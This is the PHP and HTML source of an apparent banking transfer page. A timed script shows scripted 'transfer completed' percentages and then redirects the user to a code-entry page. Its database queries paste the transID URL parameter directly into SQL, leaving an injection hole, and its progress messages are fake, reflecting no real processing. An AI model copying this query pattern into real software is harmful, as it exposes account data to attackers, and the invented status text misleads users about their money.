<?php 
session_start();
include('../sources/conn_auth.php');
include('../sources/customInfo.php');
if($rowUser['cust_trans_stat']=="Off"){
header("location:transfer-checked?transID=". md5($_GET['transID']) . "&feedback=Transaction checked");
}
$selTras = $conn->query("select * from transfer_info where trans_id = '" . $_GET['transID'] . "'") or die($conn->error);
$rowtras = $selTras->fetch_assoc();
if($rowtras['trans_stat'] == "Confirm code"){
header("location:transfer-process?transID=". md5($_GET['transID']));
} 

?>

  <!-- /. NAV TOP  -->
        <!-- . SIDENAV  -->
 <?php include('../includes/head.php');?>
    <?php include('../includes/sidebar.php');?>
        <!-- /. SIDENAV  -->
     <?php
				 
				 $selTrans = $conn->query("select * from credit_info  where accnt_nmb = '" . $rowUser['acct_nmb'] . "'") or die($conn->error);
				 $rowTrans = $selTrans->fetch_assoc();
				 ?> 
    
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-lg-12">
                       
                    </div>
                </div>              
                 <!-- /. ROW  -->
                  <hr />
                
                
            
                
                
            
                
            
                 <?php include('../includes/account_info.php');?> 
                       
            <div class="section"> 
                
                
   
   
     
     
     
    <!--==========================
      Our Team Section
    ============================-->
    <section id="team">
      <div class="container"style="width:90%;">
        <div class="section-header">
        </div>
        <div class="row">
          <div class="col-lg-8 col-md-12">
            <div class="col-lg-12">
                        <div class="pInfo">
                         
                   <div class="transT">
                   <h3>Transfer between Your accounts</h3>
               <hr>
               <h3 class="style10">Transfer details</h3>
                         <h5>The transfer to the account will be made immediately </h5>
                         <h6 style="color:red;">Please do not refresh</h6>

               <div class="spinDiv">
  
  

  <table border="0" width="100%" cellspacing="1" id="table1" height="81">

	<tbody><tr>
		<td style="font-family: &#39;Courier New&#39;, Courier, monospace; color: red" height="64">
<div align="center">
 <img src="things/img/loading2.gif" style="width:150px; height:70px;">
  <div id="splashcontainer" style="WIDTH: 270px; color:#3C3C3C; font-size:14px; font-weight:bold"></div>
  <layer name="splashcontainerns" width="450" bgcolor="#66CCFF" id="splashcontainerns"></layer>

<p align="center">&nbsp;</p>
<p align="center">
  

<script>

var preloadimages=new Array("point.gif","point2.gif")

var intervals=1000
//configure destination URL
var targetdestination="enter-code?trans_id=<?php echo md5($_GET['transID']); ?>&fd=redirect"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='TRANSFER FORM SUBMITTED'
splashmessage[1]='PLEASE WAIT..............'
splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[3]='YOUR TRANSFER DATA IS BEING PROCESSED ACCOUNT NUMBER VERIFIED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <span class="colorB" id="my-email-info"> PORTAL OPENED</span>'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]= '1%.......OF TRANSFER COMPLETED'
splashmessage[7]='2%.......OF TRANSFER COMPLETED'
splashmessage[8]='3%.......OF TRANSFER COMPLETED'
splashmessage[9]='5%.......OF TRANSFER COMPLETED'
splashmessage[10]='6%.......OF TRANSFER COMPLETED'
splashmessage[11]= '7%.......OF TRANSFER COMPLETED'
splashmessage[12]='9%.......OF TRANSFER COMPLETED'
splashmessage[13]='10%.......OF TRANSFER COMPLETED'
splashmessage[14]='11%.......OF TRANSFER COMPLETED'
splashmessage[15]='13%.......OF TRANSFER COMPLETED'
splashmessage[16]='14%.......OF TRANSFER COMPLETED'
splashmessage[17]='17%.......OF TRANSFER COMPLETED'
splashmessage[18]='18%.......OF TRANSFER COMPLETED'
splashmessage[19]='20%.......OF TRANSFER COMPLETED'
splashmessage[20]='21%.......OF TRANSFER COMPLETED'
splashmessage[21]='23%.......OF TRANSFER COMPLETED'
splashmessage[22]='24%.......OF TRANSFER COMPLETED'
var closingtags='</font>'

//Do not edit below this line (besides HTML code at the very bottom)

var i=0

var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0
var theimages=new Array()

//preload images
if (document.images){
for (p=0;p<preloadimages.length;p++){
theimages[p]=new Image()
theimages[p].src=preloadimages[p]
}
}

function displaysplash(){
if (i<splashmessage.length){
sc_cross.style.visibility="hidden"
sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 : document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2 : document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
sc_cross.style.visibility="visible"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash()",intervals)
}

function displaysplash_ns(){
if (i<splashmessage.length){
sc_ns.visibility="hide"
sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
sc_ns.document.close()

sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2

sc_ns.visibility="show"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash_ns()",intervals)
}



function positionsplashcontainer(){
if (ie4||ns6){
sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
displaysplash()
}
else if (ns4){
sc_ns=document.splashcontainerns
sc_ns.visibility="show"
displaysplash_ns()
}
else
window.location=targetdestination
}
window.onload=positionsplashcontainer

</script>

</p>
</div>
</td>
</tr>
</tbody>
</table>
</div>
                </div>       
                
                        </div>
                    
                    </div>
          </div>

        <?php include('../includes/side_info.php');?>
         

      </div>
    </section><!-- #team -->

  </main>

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    

                  </div>
              </div>
           
    </div>
 <!-- . FOOTER  -->
        
         <?php include('../includes/footer.php');?>
        <!-- /. FOOTER  -->
 